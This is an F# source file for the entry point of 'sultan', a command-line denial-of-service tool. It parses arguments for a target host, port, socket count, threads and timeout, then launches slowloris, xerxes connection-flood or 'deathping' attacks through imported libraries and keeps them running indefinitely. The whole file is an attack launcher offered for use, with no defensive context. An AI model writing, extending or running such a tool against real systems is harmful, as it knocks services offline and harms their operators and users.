#nowarn "20"
#nowarn "67"

open sultan
open sultan.printxlib
open sultan.xerxeslib
open sultan.pinglib

open System
open System.Threading

module sultan =

    let E : string = string (char 0x1B)
    let invoke_slowloris (args : string[]) =
        let mutable usessl : bool = false
        let mutable timeout : int = 120000
        if args.Length < 2 then
                errorfn "100 Target host not provided. Aborting."
                exit 1
                else verbose "starting..."
        try
            usessl <- System.Boolean.Parse(args.[5])
            ()
        with
            | :? ArgumentException as err ->
                warn "101 useSSL parameter is null, defaulting to FALSE"
                ()
            | :? IndexOutOfRangeException as err ->
                warn "101 useSSL parameter is null, defaulting to FALSE"
                ()
            | :? FormatException as err ->
                warn "102 useSSL parameter was not in the correct format, defaulting to FALSE"
                ()
        try
            timeout <- System.Int32.Parse(args.[4])
            ()
        with
            | :? ArgumentException as err ->
                warn "103 timeout parameter is null, defaulting to 120000 ms"
                ()
            | :? IndexOutOfRangeException as err ->
                warn "103 timeout parameter is null, defaulting to 120000 ms"
                ()
            | :? FormatException as err ->
                warn "104 timeout parameter is not a valid number, defaulting to 120000 ms"
                ()
        let weapon = new sllib(timeout)
        weapon.attack(args.[1], System.Int32.Parse(args.[2]), usessl, System.Int32.Parse(args.[3]));
        Thread.Sleep(Timeout.Infinite);
        0

    let invoke_xerxes (args : string[]) =
         if args.Length < 2 then
             errorfn "200 Target host not provided. Aborting."
             exit 1
             else verbose "starting..."

         xerxeslib.attack args.[1] (Int32.Parse(args.[2])) 1 (Int32.Parse(args.[3])) (Int32.Parse(args.[4]))
         Thread.Sleep(Timeout.Infinite);
         0

    let invoke_pod (args : string array) =
        if args.Length < 2 then
                errorfn "300 Target host or IP not provided. Aborting."
                exit 1
                else verbose "starting..."
        pinglib.attackp 1 args.[1]
        0


    let help =
        let year = System.Int32.Parse(System.DateTime.Now.ToString("yyyy"))
        printfn "sultan v0.3.0"
        printfn "MIT (c) %i LPTSTR members" year
        printf "\n"
        printfn "Usage: .\sultan slowloris [host] [port] [socket_count] [timeout] [useSSL? (true|false)]"
        printfn "Usage: .\sultan xerxes [host] [port] [connections] [threads]"
        printfn "Usage: .\sultan deathping [host]"
        printf "\n"

    [<EntryPoint>]
    let main argv =
        consoletool.enableVTMode() |> ignore
        // go nuts if there aren't enough args'
        if argv.Length < 1 then
            help
            errorfn "001 Not enough arguments. Aborting."
            exit 1
        else

        try
            if (argv.[0]).Equals("slowloris") then invoke_slowloris argv
            elif (argv.[0]).Equals("xerxes") then invoke_xerxes argv
            elif (argv.[0]).Equals("deathping") then invoke_pod argv else 0
        with
            | :? System.Exception as err ->
                errorfn ( String.Format("0x{0:X8} {2} {3} -> {1}", err.HResult, err.Message, err.TargetSite, (((err.GetType()).ToString()).ToUpper())))
                0
        0
